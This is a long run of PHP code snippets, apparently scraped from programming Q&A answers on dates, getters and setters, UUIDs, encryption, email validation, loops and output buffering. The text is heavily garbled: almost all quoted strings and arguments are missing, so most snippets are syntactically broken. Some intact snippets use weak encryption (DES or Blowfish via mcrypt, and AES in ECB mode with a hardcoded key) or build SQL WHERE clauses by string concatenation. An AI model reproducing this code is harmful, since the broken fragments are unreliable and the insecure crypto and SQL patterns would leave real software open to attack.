$report_starting_date=date( $report_ending_date=date( $report_starting_date1=date( while (strtotime($report_starting_date1)<strtotime($report_ending_date)) { $report_starting_date1=date( $dates[]=$report_starting_date1; } print_r($dates); ( [0] => 2014-09-16 [1] => 2014-09-17 [2] => 2014-09-18 [3] => 2014-09-19 [4] => 2014-09-20 [5] => 2014-09-21 [6] => 2014-09-22 [7] => 2014-09-23 [8] => 2014-09-24 [9] => 2014-09-25 [10] => 2014-09-26 )
$first = $last= $first_time_arr=explode( $last_time_arr=explode( $start_timestamp=mktime(0,0,0, $first_time_arr[0], $first_time_arr[1],$first_time_arr[2]); $end_timestamp=mktime(0,0,0, $last_time_arr[0], $last_time_arr[1],$last_time_arr[2]); $date_arr=array(); for($i=$start_timestamp;$i<=$end_timestamp;$i=$i+86400){ $date_arr[]=date("Y-m-d",$i); }
public static function countDays($date1,$date2) { $date1 = strtotime($date1); $date2 = strtotime($date2); $datediff = $date1 - $date2; return floor($datediff/(60*60*24)); } public static function dateRange($date1,$date2) { $count = static::countDays($date1,$date2) + 1; $dates = array(); for($i=0;$i<$count;$i++) { $dates[] = date("Y-m-d",strtotime($date2. } return $dates; }
function datesbetween ($date1,$date2) { $dates= array(); for ($i = $date1 ; $i<= $date1 ; $i=date_add($i, date_interval_create_from_date_string( { $dates[] = clone $i; } return $dates; }
function getDatesFromRange($a,$b,$x=0,$dates=[]){ while(end($dates)!=$b && $x=array_push($dates,date("Y-m-d",strtotime("$a +$x day")))); return $dates; } var_export(getDatesFromRange(
function getDatesFromRange($a,$b,$x=0,$dates=[]){ while(end($dates)!=$b && $x=-array_push($dates,date("Y-m-d",strtotime("$a +$x day")))); return $dates; } var_export(getDatesFromRange(
function getDatesFromRange($a,$b,$format= while(date($format,strtotime(end($dates)))!=date($format,strtotime($b)) && $x=array_push($dates,date($format,strtotime("$a +$x day")))); return $dates; } $formats=array("Computer"=> $start= $end= foreach($formats as $label=>$format){ echo "<br>$label<br>"; var_export(getDatesFromRange($start,$end,$format)); echo "<br>"; }
Computer array ( 0 => 4 => 8 => 12 => American array ( 0 => 4 => 8 => 12 => Non-American array ( 0 => 4 => 8 => 12 =>
$dates = new DatePeriod( new DateTime( ); foreach ($dates as $key => $value) { echo $value->format( }
function getDatesFromRange($start_date, $end_date, $date_format = { $dates_array = array(); for ($x = strtotime($start_date); $x <= strtotime($end_date); $x += 86400) { array_push($dates_array, date($date_format, $x)); } return $dates_array; } print_r( getDatesFromRange(
function getWeekdayDatesFrom($format, $start_date_epoch, $end_date_epoch, $range) { $dates_arr = array(); if( ! $range) { $range = round(abs($start_date_epoch-$end_date_epoch)/86400) + 1; } else { $range = $range + 1; } $current_date_epoch = $start_date_epoch; for($i = 1; $i <= $range; $i+1) { $d = date( if($d <= 5) { $dates_arr[] = " } $next_day_epoch = strtotime( $i++; $current_date_epoch = $next_day_epoch; } return $dates_arr; }
$arr = range(strtotime("2013-12-01"),strtotime("2013-12-31"), "86400"); array_walk_recursive($arr, function(&$element) { $element = date("Y-m-d", $element); }); print_r ($arr);
$MAX_FILENAME_LENGTH = 260; $file_name = $_FILES[$upload_name][ $file_extension = end(explode( $uploadErrors = array( 0=> 1=> 2=> 3=> 4=> 6=> );
$fileName = $tmp = explode( $fileExtension = end($tmp); echo $fileExtension;
$basenameAndExtension = explode( $ext = end($basenameAndExtension);
class MyClass { private $firstField; private $secondField; public function getFirstField() { return $this->firstField; } public function setFirstField($x) { $this->firstField = $x; } public function getSecondField() { return $this->secondField; } public function setSecondField($x) { $this->secondField = $x; } }
class MyClass { public $firstField; public $secondField; }
<?php class MyClass { private $firstField; private $secondField; public function __get($property) { if (property_exists($this, $property)) { return $this->$property; } } public function __set($property, $value) { if (property_exists($this, $property)) { $this->$property = $value; } return $this; } } ?>
class Foo { public $bar; } $foo = new Foo; $foo->bar = "string";
class Foo { public int bar; } Foo myFoo = new Foo(); myFoo.bar = "string";
public function __call($name, $arguments) { if (property_exists(get_class($this), $name)) { if (count($arguments) == 1) { $this->$name = $arguments[0]; } else if (count($arguments) > 1) { throw new \Exception("Setter for $name only accepts one parameter."); } return $this->$name; } $prefix = substr($name, 0, 3); $property = strtolower($name[3]) . substr($name, 4); switch ($prefix) { case return $this->$property; break; case if (count($arguments) != 1) { throw new \Exception("Setter for $name requires exactly one parameter."); } $this->$property = $arguments[0]; return $this->$name; default: throw new \Exception("Property $name doesn break; } }
class MyClass { private $firstField; private $secondField; private $thirdField; public function __get( $name ) { if( method_exists( $this , $method = ( return $this->$method(); else throw new Exception( } public function __set( $name , $value ) { if( method_exists( $this , $method = ( return $this->$method( $value ); else throw new Exception( } public function __isset( $name ) { return method_exists( $this , || method_exists( $this , } public function getFirstField() { return $this->firstField; } protected function setFirstField($x) { $this->firstField = $x; } private function getSecondField() { return $this->secondField; } } $obj = new MyClass(); echo $obj->firstField; $obj->firstField = echo $obj->getFirstField(); $obj->setFirstField( echo $obj->secondField; echo $obj->getSecondField(); $obj->secondField = echo $obj->thirdField; isset( $obj->firstField ); isset( $obj->secondField ); isset( $obj->thirdField );
" some {mathsobj1->generatelatex} multi line text {mathsobj1->latexoutput} with lots of variables for {mathsobj1->generatelatex} some reason "
$dnastringobj->homeobox($one_rememberable_parameter)->gattaca->findrelated() $dnastringobj->homeobox($one_rememberable_parameter)->gttccaatttga->findrelated()
public function __call($_name, $_arguments){ $action = substr($_name, 0, 4); $varName = substr($_name, 4); if (isset($this->{$varName})){ if ($action === "get_") return $this->{$varName}; if ($action === "set_") $this->{$varName} = $_arguments[0]; } }
class MyClass{ private foo = "bar"; private bom = "bim"; } $C = new MyClass(); $C->get_foo(); $C->get_bom(); $C->set_foo("abc"); $C->set_bom("zam");
private $callWhiteList = array( "foo" => "foo", "fee" => "fee", ); public function __call($_name, $_arguments){ $action = substr($_name, 0, 4); $varName = $this->callWhiteList[substr($_name, 4)]; if (!is_null($varName) && isset($this->{$varName})){ if ($action === "get_") return $this->{$varName}; if ($action === "set_") $this->{$varName} = $_arguments[0]; } }
private $callWhiteList = array( "myfoo" => "foo", "zim" => "bom", );
class MyClass{ private foo = "bar"; private bom = "bim"; } $C = new MyClass(); $C->get_myfoo(); $C->get_zim(); $C->set_myfoo("abc"); $C->set_zim("zam");
class BirthDate { private $birth_date; public function getBirthDate($format= return $birth_date; } public function setBirthDate($birth_date) { $this->birth_date = $birth_date; } public function getAge() { return $age; } public function getDaysUntilBirthday() { return $days; } }
class LivingBirthDate extends BirthDate { public function setBirthDate($birth_date) { return parent::setBirthDate($birth_date); } }
public function doActionOne($array) { $this->args = $array; $name = __FUNCTION__; $this->response = $this->executeCoreCall("APIService.{$name}"); } public function doActionTwo($array) { $this->args = $array; $name = __FUNCTION__; $this->response = $this->executeCoreCall("APIService.{$name}"); } public function doActionThree($array) { $this->args = $array; $name = __FUNCTION__; $this->response = $this->executeCoreCall("APIService.{$name}"); } protected function executeCoreCall($service) { $cURL = new \cURL(); return $cURL->( ->getResponse(); }
public function __call($name, $arguments) { $this->args = $arguments; $this->response = $this->executeCoreCall("APIService.{$name}"); return $this; }
class Model { private $propOne; private $propTwo; public function propOne($propVal = { if ($propVal === return $this->propOne; } else { $this->propOne = $propVal; return $this; } } public function propTwo($propVal = { if ($propVal === return $this->propTwo; } else { $this->propTwo = $propVal; return $this; } } }
<?php function gen_uuid() { $uuid = array( ); $uuid[ $uuid[ $uuid[ $uuid[ $uuid[ for ($i = 0; $i < 6; $i++) { $uuid[ } $uuid = sprintf( $uuid[ $uuid[ $uuid[ $uuid[ $uuid[ $uuid[ $uuid[ $uuid[ $uuid[ $uuid[ $uuid[ ); return $uuid; } ?>
function gen_uuid() { return sprintf( mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff ), mt_rand( 0, 0x0fff ) | 0x4000, mt_rand( 0, 0x3fff ) | 0x8000, mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff ) ); }
function guidv4($data) { assert(strlen($data) == 16); $data[6] = chr(ord($data[6]) & 0x0f | 0x40); $data[8] = chr(ord($data[8]) & 0x3f | 0x80); return vsprintf( } echo guidv4(openssl_random_pseudo_bytes(16));
function guidv4() { if (function_exists( return trim(com_create_guid(), $data = openssl_random_pseudo_bytes(16); $data[6] = chr(ord($data[6]) & 0x0f | 0x40); $data[8] = chr(ord($data[8]) & 0x3f | 0x80); return vsprintf( }
function guid() { $randomString = openssl_random_pseudo_bytes(16); $time_low = bin2hex(substr($randomString, 0, 4)); $time_mid = bin2hex(substr($randomString, 4, 2)); $time_hi_and_version = bin2hex(substr($randomString, 6, 2)); $clock_seq_hi_and_reserved = bin2hex(substr($randomString, 8, 2)); $node = bin2hex(substr($randomString, 10, 6)); /** * Set the four most significant bits (bits 12 through 15) of the * time_hi_and_version field to the 4-bit version number from * Section 4.1.3. * @see http: */ $time_hi_and_version = hexdec($time_hi_and_version); $time_hi_and_version = $time_hi_and_version >> 4; $time_hi_and_version = $time_hi_and_version | 0x4000; /** * Set the two most significant bits (bits 6 and 7) of the * clock_seq_hi_and_reserved to zero and one, respectively. */ $clock_seq_hi_and_reserved = hexdec($clock_seq_hi_and_reserved); $clock_seq_hi_and_reserved = $clock_seq_hi_and_reserved >> 2; $clock_seq_hi_and_reserved = $clock_seq_hi_and_reserved | 0x8000; return sprintf( }
$r = unpack( $uuid = sprintf( $r[1], $r[2], $r[3], $r[4] & 0x0fff | 0x4000, $r[5] & 0x3fff | 0x8000, $r[6], $r[7], $r[8])
$conn = new mysqli($servername, $username, $password, $dbname, $port); $query = echo $conn->query($query)->fetch_row()[0];
<?php /** * <code> * {? $old_section = "whatever" ?} * </code> */ Blade::extend(function($value) { return preg_replace( });
/* |-------------------------------------------------------------------------- | Extend blade so we can define a variable | <code> | @define $variable = "whatever" | </code> |-------------------------------------------------------------------------- */ \Blade::extend(function($value) { return preg_replace( });
class BaseController extends Controller { public function __construct() { View::share( } }
<?php /* |-------------------------------------------------------------------------- | Extend blade so we can define a variable | <code> | @set(name, value) | </code> |-------------------------------------------------------------------------- */ Blade::directive( list($name, $val) = explode( return "<?php {$name} = {$val}; ?>"; });
<?php namespace App\Providers; class AppServiceProvider extends ServiceProvider { public function boot() { view()->share( } public function register() { } }
@if(($users = User::all())->count()) @foreach($users as $user) {{ $user->name }} @endforeach @else There are no users. @endif
public function action_hello($userName) { return View::make( }
public function action_hello($first, $last) { $data = array( ); return View::make( }
Original String + Salt or Key --> Encrypted String Encrypted String + Salt or Key --> Decrypted (Original String)
"hello world!" + "ABCD1234" --> Encrypt --> "2a2ffa8f13220befbe30819047e23b2c" (may be, for e.g) "2a2ffa8f13220befbe30819047e23b2c" --> Decrypt with "ABCD1234" --> "hello world!"
<?php declare(strict_types=1); /** * Encrypt a message * * @param string $message - message to encrypt * @param string $key - encryption key * @return string * @throws RangeException */ function safeEncrypt(string $message, string $key): string { if (mb_strlen($key, throw new RangeException( } $nonce = random_bytes(SODIUM_CRYPTO_SECRETBOX_NONCEBYTES); $cipher = base64_encode( $nonce. sodium_crypto_secretbox( $message, $nonce, $key ) ); sodium_memzero($message); sodium_memzero($key); return $cipher; } /** * Decrypt a message * * @param string $encrypted - message encrypted with safeEncrypt() * @param string $key - encryption key * @return string * @throws Exception */ function safeDecrypt(string $encrypted, string $key): string { $decoded = base64_decode($encrypted); $nonce = mb_substr($decoded, 0, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES, $ciphertext = mb_substr($decoded, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES, null, $plain = sodium_crypto_secretbox_open( $ciphertext, $nonce, $key ); if (!is_string($plain)) { throw new Exception( } sodium_memzero($ciphertext); sodium_memzero($key); return $plain; }
<?php require "safeCrypto.php"; $key = random_bytes(SODIUM_CRYPTO_SECRETBOX_KEYBYTES); $message = $ciphertext = safeEncrypt($message, $key); $plaintext = safeDecrypt($ciphertext, $key); var_dump($ciphertext); var_dump($plaintext);
<?php use \ParagonIE\Halite\KeyFactory; use \ParagonIE\Halite\Symmetric\Crypto as SymmetricCrypto; $key = new KeyFactory::generateEncryptionKey(); KeyFactory::save($key, $loadedkey = KeyFactory::loadEncryptionKey( $message = $ciphertext = SymmetricCrypto::encrypt($message, $key); $plaintext = SymmetricCrypto::decrypt($ciphertext, $key); var_dump($ciphertext); var_dump($plaintext);
<?php /** * This requires https: * php composer.phar require defuse/php-encryption */ use Defuse\Crypto\Crypto; use Defuse\Crypto\Key; require "vendor/autoload.php"; $key = Key::createNewRandomKey(); $message = $ciphertext = Crypto::encrypt($message, $key); $plaintext = Crypto::decrypt($ciphertext, $key); var_dump($ciphertext); var_dump($plaintext);
/** * Replace this with your own salt! * Use bin2hex() then add \x before every 2 hex characters, like so: */ define(
/** * Get an AES key from a static password and a secret salt * * @param string $password Your weak password here * @param int $keysize Number of bytes in encryption key */ function getKeyFromPassword($password, $keysize = 16) { return hash_pbkdf2( $password, MY_PBKDF2_SALT, 100000, $keysize, true ); }
<?php define("ENCRYPTION_KEY", "!@ $string = "This is the original data string!"; echo $encrypted = encrypt($string, ENCRYPTION_KEY); echo "<br />"; echo $decrypted = decrypt($encrypted, ENCRYPTION_KEY); /** * Returns an encrypted & utf8-encoded */ function encrypt($pure_string, $encryption_key) { $iv_size = mcrypt_get_iv_size(MCRYPT_BLOWFISH, MCRYPT_MODE_ECB); $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND); $encrypted_string = mcrypt_encrypt(MCRYPT_BLOWFISH, $encryption_key, utf8_encode($pure_string), MCRYPT_MODE_ECB, $iv); return $encrypted_string; } /** * Returns decrypted original string */ function decrypt($encrypted_string, $encryption_key) { $iv_size = mcrypt_get_iv_size(MCRYPT_BLOWFISH, MCRYPT_MODE_ECB); $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND); $decrypted_string = mcrypt_decrypt(MCRYPT_BLOWFISH, $encryption_key, $encrypted_string, MCRYPT_MODE_ECB, $iv); return $decrypted_string; } ?>
$string_to_encrypt="Test"; $password="password"; $encrypted_string=openssl_encrypt($string_to_encrypt,"AES-128-ECB",$password); $decrypted_string=openssl_decrypt($encrypted_string,"AES-128-ECB",$password);
$string = $encrypted = \Illuminate\Support\Facades\Crypt::encrypt($string); $decrypted_string = \Illuminate\Support\Facades\Crypt::decrypt($encrypted); var_dump($string); var_dump($encrypted); var_dump($decrypted_string);
<?php echo("<h3> Symmetric Encryption </h3>"); $key_value = "KEYVALUE"; $plain_text = "PLAINTEXT"; $encrypted_text = mcrypt_ecb(MCRYPT_DES, $key_value, $plain_text, MCRYPT_ENCRYPT); echo ("<p><b> Text after encryption : </b>"); echo ( $encrypted_text ); $decrypted_text = mcrypt_ecb(MCRYPT_DES, $key_value, $encrypted_text, MCRYPT_DECRYPT); echo ("<p><b> Text after decryption : </b>"); echo ( $decrypted_text ); ?>
function sign($message, $key) { return hash_hmac( } function verify($bundle, $key) { return hash_equals( hash_hmac( mb_substr($bundle, 0, 64, ); } function getKey($password, $keysize = 16) { return hash_pbkdf2( } function encrypt($message, $password) { $iv = random_bytes(16); $key = getKey($password); $result = sign(openssl_encrypt($message, return bin2hex($iv).bin2hex($result); } function decrypt($hash, $password) { $iv = hex2bin(substr($hash, 0, 32)); $data = hex2bin(substr($hash, 32)); $key = getKey($password); if (!verify($data, $key)) { return null; } return openssl_decrypt(mb_substr($data, 64, null, } $string_to_encrypt= $password= $encrypted_string=encrypt($string_to_encrypt, $password); $decrypted_string=decrypt($encrypted_string, $password);
function xrange($min, $max) { for ($i = $min; $i <= $max; $i++) { yield $i; } }
foreach (xrange(1, 10) as $key => $value) { echo "$key => $value", PHP_EOL; }
<?php echo function a(){ echo for($i=1; $i<=9; $i++) yield $i; echo } foreach(a() as $v) echo $v. echo ?>
function a($items) { foreach ($items as $item) { yield $item + 1; } }
function b($items) { $result = []; foreach ($items as $item) { $result[] = $item + 1; } return $result; }
$closure = function ($injected1, $injected2, ...){ $returned = array(); $returned[] = $returned1; $returned[] = $returned2; return $returned; }; $returned = $closure($injected1, $injected2, ...);
$closure1 = function ($injected1){ return $returned1; }; $closure2 = function ($injected2){ return $returned1; }; $returned1 = $closure1($injected1); $returned2 = $closure2($injected2);
$closure = function (){ $injected1 = yield; $injected2 = (yield($returned1)); $injected3 = (yield($returned2)); yield($returnedN); }; $generator = $closure(); $returned1 = $generator->send($injected1); $returned2 = $generator->send($injected2); $returnedN = $generator->send($injectedN);
function validateEMAIL($EMAIL) { $v = "/[a-zA-Z0-9_-.+]+@[a-zA-Z0-9-]+.[a-zA-Z]+/"; return (bool)preg_match($v, $EMAIL); }
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) { }
<?php $pattern = $emailaddress = if (preg_match($pattern, $emailaddress) === 1) { }
<?php function validateEmail($email) { return filter_var($email, FILTER_VALIDATE_EMAIL); } ?>
public static function validateEmail($email) { $emailIsValid = FALSE; if (!empty($email)) { $domain = ltrim(stristr($email, $user = stristr($email, if ( !empty($user) && !empty($domain) && checkdnsrr($domain) ) {$emailIsValid = TRUE;} } return $emailIsValid; }
$email = $_POST[ $emailB = filter_var($email, FILTER_SANITIZE_EMAIL); if (filter_var($emailB, FILTER_VALIDATE_EMAIL) === false || $emailB != $email ) { echo "This email adress isn exit(0); }
/* * Check for valid MX record for given email domain */ if(!function_exists( function check_email_domain($email) { $email_host = explode("@", $email); $host = end($email_host) . "."; return checkdnsrr(idn_to_ascii($host), "MX"); } }
if (!preg_match_all("/(?![[:alnum:]]|@|-|_|\.)./",$email)) { .. }
<?php $im = new imagick( $im->setImageFormat( header( echo $im; ?>
<?php $im = new Imagick(); $im->setResolution(300, 300); $im->readImage( $im->setImageFormat( header( echo $im; ?>
$im->readimageblob($blob); $im->setiteratorindex(0);
<?php $pdf = "filename.pdf"; $info = pathinfo($pdf); $file_name = basename($pdf, echo $file_name; $pdf = "filename.pdf[0]"; exec("convert $pdf convert-img/$file_name.jpg"); ?>
$pdflib = new ImalH\PDFLib\PDFLib(); $pdflib->setPdfPath($pdf_file_path); $pdflib->setOutputPath($folder_path_for_images); $pdflib->convert();
$size = count($x); for ($i=0; $i<$size; $i++) { } for ($i=0; $i<count($x); $i++) { }
<?php $a = array(); for ($i = 0; $i < 1000000; ++$i) { $a[] = 100; } $time = time(); for ($i = 0; $i < 1000000000; ++$i) { $b = count($a); } print("1 000 000 000 iteration of count() took ".(time()-$time)." sec\n"); $time = time(); for ($i = 0; $i < 1000000000; ++$i) { $b = sizeof($a); } print("1 000 000 000 iteration of sizeof() took ".(time()-$time)." sec\n"); ?>
1 000 000 000 iteration of count() took 414 sec 1 000 000 000 iteration of sizeof() took 1369 sec
$cars = array("Volvo","BMW","Toyota"); echo count($cars);
$today = date("Y-m-d H:i:s"); $date = "2010-01-21 00:00:00"; if ($date < $today) {
function isToday($time) { return (strtotime($time) === strtotime( } isToday(
function isPast($time) { return (strtotime($time) < time()); } function isFuture($time) { return (strtotime($time) > time()); }
$past = new DateTime("2010-01-01 00:00:00"); $now = new DateTime(); $future = new DateTime("2020-01-01 00:00:00");
var_dump($past < $now); var_dump($future < $now); var_dump($now == $past); var_dump($now == new DateTime()); var_dump($now == $future); var_dump($past > $now); var_dump($future > $now);
var_dump($past ->getTimestamp()); var_dump($now ->getTimestamp()); var_dump($future->getTimestamp()); var_dump($past ->getTimestamp() < $now->getTimestamp()); var_dump($future->getTimestamp() > $now->getTimestamp());
$toBeComparedDate = $today = (new DateTime())->format( $expiry = (new DateTime($toBeComparedDate))->format( var_dump(strtotime($today) > strtotime($expiry));
$var = "2016-11-09 00:00:00.0"; if ( time() <= strtotime($var) ) { }
if (date("Y-m-d") <= $input) { echo "Input date is equal to or greater than today."; }
$date1=date_create("2014-07-02"); $date2=date_create("2013-12-12"); $diff=date_diff($date1,$date2);
$date = new simpleDate(); echo $date->now()->compare(
$date1=date_create($someDate); $date2=date_create(date("Y-m-d")); $diff=date_diff($date1,$date2); $intDiff = $diff->format("%R%a"); $intDiff = intval($intDiff); if ($intDiff > 0) {echo else {echo
$now = new DateTime(); $diff=date_diff($yourdate,$now); $diff_days = $diff->format("%a"); if($diff_days > 10){ echo "OLD! " . $yourdate->format( }else{ echo "NEW! " . $yourdate->format( }
$request = $this->getRequest(); $username= $request->request->get(
foreach($request->request->all() as $req){ print_r($req[ }
use Symfony\Component\HttpFoundation\Request; public function updateAction(Request $request) { $request->query->get( $request->request->get(
use Symfony\Component\HttpFoundation\Request; public function updateAction(Request $request) { $foo = $request->get( $bar = $request->get( }
use Symfony\Component\HttpFoundation\Request; public function updateAction(Request $request, $foo, $bar) { echo $foo; echo $bar; }
acme_myurl: pattern: /acme/news/{foo}/{bar} defaults: { _controller: AcmeBundle:Default:getnews }
use Symfony\Component\HttpFoundation\Request; public function updateAction(Request $request) { $request->query->get( $request->request->get( }
$request = $this->getRequest(); $username = $request->get(
$request = Request::createFromGlobals(); $getParameter = $request->get(
public function indexAction(Request $request) { $data = $request->get( $data1 = $request->query->get( }
array_splice($array, array_search(array_value,$array),1);
function custom_unset(&$array=array(), $key=0) { if(isset($array[$key])){ unset($array[$key]); $array = array_values($array); } return $array; }
$my_array=array( 0=> 1=> 2=> ); custom_unset($my_array, 1);
array(2) { [0]=> string(5) "test0" [1]=> string(5) "test2" }
if ($handle = opendir( while (false !== ($entry = readdir($handle))) { if ($entry != "." && $entry != "..") { echo "$entry\n"; } } closedir($handle); }
for(int i=0; i< arr.length;i++){ boolean isLastElem = i== (arr.length -1) ? true : false; }
$numItems = count($arr); $i = 0; foreach($arr as $key=>$value) { if(++$i === $numItems) { echo "last index!"; } }
$last_key = end(array_keys($array)); foreach ($array as $key => $value) { if ($key == $last_key) { } else { } }
foreach($input as $key => $value) { $ret .= "$value"; if (next($input)==true) $ret .= ","; }
$toEnd = count($arr); foreach($arr as $key=>$value) { if (0 === --$toEnd) { echo "last index! $value"; } }
foreach($arr as $key=>$value) { } echo "last index! $key => $value";
$lastValue = array_pop($array); echo "Last is $lastValue", "\n"; foreach ($array as $key => $value) { echo "All except last value: $value", "\n"; } echo "Last is $lastValue", "\n";
$params = []; foreach ($array as $value) { $params[] = doSomething($value); } $parameters = implode(" and ", $params);
$arr = range(1, 3); $it = new CachingIterator(new ArrayIterator($arr)); foreach($it as $key => $value) { if (!$it->hasNext()) echo echo $value, "\n"; }
foreach($array as $element) { if ($element === end($array)) echo }
foreach($array as $key => $element) { end($array); if ($key === key($array)) echo }
foreach ($some_array as $element) { if(!next($some_array)) { } }
foreach($array as $key=>$value) { echo $value; if($key != count($array)-1) { echo ", "; } }
$first = true; foreach($array as $key => $value) { if ($first) { $first = false; echo "List of key, value pairs:\n"; } else { echo "\n"; } echo $key . }
$first = true; foreach($array as $key => $subArray) { if ($first) { $string = "List of key => value array pairs:\n"; $first = false; } else { echo "\n"; } $string .= $key . $first = true; foreach($subArray as $key => $value) { if ($first) { $first = false; } else { $string .= } $string .= $key . } $string .= } echo $string;
List of key => value array pairs: key1=>(v1_key1=>v1_val1, v1_key2=>v1_val2) key2=>(v2_key1=>v2_val1, v2_key2=>v2_val2, v2_key3=>v2_val3) key3=>(v3_key1=>v3_val1)
foreach ( $array as $key => $a ) { if ( end( array_keys( $array ) ) == $key ) { echo "Last element"; } else { echo "Just another element"; } }
$keys = array_keys($array); for ($i = 0, $l = count($array); $i < $l; ++$i) { $key = $array[$i]; $value = $array[$key]; $isLastItem = ($i == ($l - 1)); } $i = 0; $l = count($array); foreach ($array as $key => $value) { $isLastItem = ($i == ($l - 1)); ++$i; }
$given_array = array( $glue = foreach($given_array as $column_name=>$value){ $where .= " $glue $column_name = $value"; $glue = } echo $where;
column1 = value1 AND column2 = value2 AND column3 = value3
$array = array( ); foreach($array as $key => $value) { if(end($array) === $value) { echo "last index!" . $value; } }
for ($i=0;$i<count(arr);$i++){ $i == count(arr)-1 ? true : false; }
end( $elements ); $endKey = key($elements); foreach ($elements as $key => $value) { if ($key == $endKey) { } }
$first = true; foreach ( $items as $item ) { $str = ($first)?$first=false:", ".$item; }
foreach ($array as $key => $value) { $class = ( $key !== count( $array ) -1 ) ? " class= echo "<div{$class}>"; echo "$value[ echo "</div>"; }
$arr = range(1, 10); $end = end($arr); reset($arr); while( list($k, $v) = each($arr) ) { if( $n == $end ) { echo } else { echo sprintf( } }
$rev_array = array_reverse($array); echo array_pop($rev_array);
<?php $week=array( $keys = array_keys($week); $string = "INSERT INTO my_table ( $string .= implode(" $string .= " $string .= implode(" $string .= " echo $string; ?>
$numItems = count($arr); $i=0; $firstitem=$arr[0]; $i++; while($i<$numItems-1){ $some_item=$arr[$i]; $i++; } $last_item=$arr[$i]; $i++;
$result = $where = ""; foreach ($conditions as $col => $val) { $result = $where .= $this->getAdapter()->quoteInto($col. $where .= " AND "; } return $this->delete($result);
$table = array( $it = reset($table); while( $it !== false ) { echo $nextIt = next($table); if ($nextIt === false || $nextIt === $it) { echo } $it = $nextIt; }
<?php foreach($have_comments as $key => $page_comment): ?> <?php echo $page_comment;?> <?php if($key+1<count($have_comments)): ?> <?php echo <?php endif;?> <?php endforeach;?>
$lastkey = count($array) - 1; foreach($array as $k=>$a){ if($k==$lastkey){ } }
foreach($array as $value) { if ($value === end($array)) { echo } }
$result = ""; foreach($data as $value) { $resut .= (next($data)) ? "$value, " : $value; }
$num = 5; $word = $format = echo sprintf($format, $num, $word);
isset() will return FALSE if testing a variable that has been set to NULL.
<?php $a = NULL; var_dump(array_key_exists( var_dump(array_key_exists(
$test_value = foreach ( $list_of_things as $thing ) { if ( some_test($thing, $test_value) ) { $result = some_function($thing); } } if ( isset($result) ) { echo }
foreach ( $list_of_tests as $test_value ) { foreach ( $list_of_things as $thing ) { if ( some_test($thing, $test_value) ) { $result = some_function($thing); } } if ( isset($result) ) { echo } }
| | ===null | is_null | isset | empty | if/else | ternary | count>0 | | ----- | ----- | ----- | ----- | ----- | ----- | ----- | ----- | | $a; | true | true | | true | | | | | null | true | true | | true | | | | | [] | | | true | true | | | | | 0 | | | true | true | | | true | | "" | | | true | true | | | true | | 1 | | | true | | true | true | true | | -1 | | | true | | true | true | true | | " " | | | true | | true | true | true | | "str" | | | true | | true | true | true | | [0,1] | | | true | | true | true | true | | new Class | | | true | | true | true | true |
function testPropertiesExist() { $sl =& $this->system_log; $props = array( foreach($props as $prop) { $this->assertTrue(property_exists($sl, $prop), "Property <{$prop}> exists"); } }
$e1 = error_get_last(); $isNULL = is_null(@$x); $e2 = error_get_last(); $isNOTSET = $e1 != $e2; echo sprintf("isNOTSET: %d, isNULL: %d", $isNOTSET, $isNULL);
$vars = get_defined_vars(); $isNOTSET = !array_key_exists("x", $vars); $isNULL = $isNOTSET ? true : is_null($x); echo sprintf("isNOTSET: %d, isNULL: %d", $isNOTSET, $isNULL);
$a = array ( var_dump(isset($a[ var_dump(isset($a[ var_dump(isset($a[
NULL Notice: Undefined variable: b in xxx on line n NULL
PHP Notice: Undefined variable: foo in /home/altern8/- on line 1
function undef($dnc) { $inf=ob_get_contents(); ob_end_clean(); if($inf>"") { if(false!==strpos($inf, "Undef"); return true; } return false; }
echo("variable is undefined"); else echo("variable exists, holding some value");
function myHndlr($en, $es, $ef, $el) { global $er; $er = (substr($es, 0, 18) == "Undefined variable"); return; } $er = false; if(empty($testvar)) { set_error_handler("myHndlr"); ($testvar === null); restore_error_handler(); } if($er) { ; }
function wait() { xmlhttp=GetXmlHttpObject(); var url="wait.php"; \ xmlhttp.onreadystatechange=statechanged; xmlhttp.open("GET", url, true); xmlhttp.send(null); } function statechanged() { if(xmlhttp.readyState==4) { document.getElementById("txt").innerHTML=xmlhttp.responseText; } }
<?php ?> <script type="text/javascript"> jsFunction(); </script>
$.get( {}, function(returnedData) { document.getElementById("txt").innerHTML = returnedData; someOtherFunctionYouWantToCall(); }, ); function someOtherFunctionYouWantToCall() { }
$.get( {}, function(returnedData) { window[returnedData](); }, );
<?php $v8 = new V8Js(); $JS = <<< EOT len = print( len; EOT; try { var_dump($v8->executeString($JS, } catch (V8JsException $e) { var_dump($e); } ?>
<td onClick= loadxml()><i>Click for Details</i></td> function loadxml() { result = loadScriptWithAjax("/script.php?event=button_clicked"); alert(result); } <?php if($_GET[ echo "\"You clicked a button\""; ?>
V8Js::registerExtension( $v8 = new V8Js(); $v8->executeString( $v8->executeString(
public function PHPFunction() { echo test(); </script> } <script type="text/javascript"> public function test() { alert( } </script>
<?php if(your condition){ echo "<script> window.onload = function() { yourJavascriptFunction(param1, param2); }; </script>"; ?>
<button onclick="xajax_addCity();">Add New City</button>
function f() { alert("its calling from echo "); } echo "<td onclick=
<?php ob_start( ); phpinfo( ); $output = ob_get_clean( ); ?>
<?php ob_start( ); echo "Hello World"; if ( $some_error ) { header( "Location: error.php" ); exit( 0 ); } ?>
; Output buffering is a mechanism for controlling how much output data ; (excluding headers and cookies) PHP should keep internally before pushing that ; data to the client. If your application ; will send that data in chunks of roughly the size you specify. ; Turning on this setting and managing its maximum buffer size can yield some ; interesting side-effects depending on your application and web server. ; You may be able to send headers and cookies after you ; through print or echo. You also may see performance benefits if your server is ; emitting less packets due to buffered output versus PHP streaming the output ; as it gets it. On production servers, 4096 bytes is a good setting for performance ; reasons. ; Note: Output buffering can also be controlled via Output Buffering Control ; functions. ; Possible Values: ; On = Enabled and buffer is unlimited. (Use with caution) ; Off = Disabled ; Integer = Enables the buffer and sets its maximum size in bytes. ; Note: This directive is hardcoded to Off for the CLI SAPI ; Default Value: Off ; Development Value: 4096 ; Production Value: 4096 ; http: output_buffering = 4096
ob_start(); echo $output = ob_get_clean(); $output = strtoupper($output); echo $output; HELLO WORLD
ob_start(); $foo->bar(); ob_clean(); $foo->render(); ob_flush(); $none = ob_get_contents(); ob_end_clean();
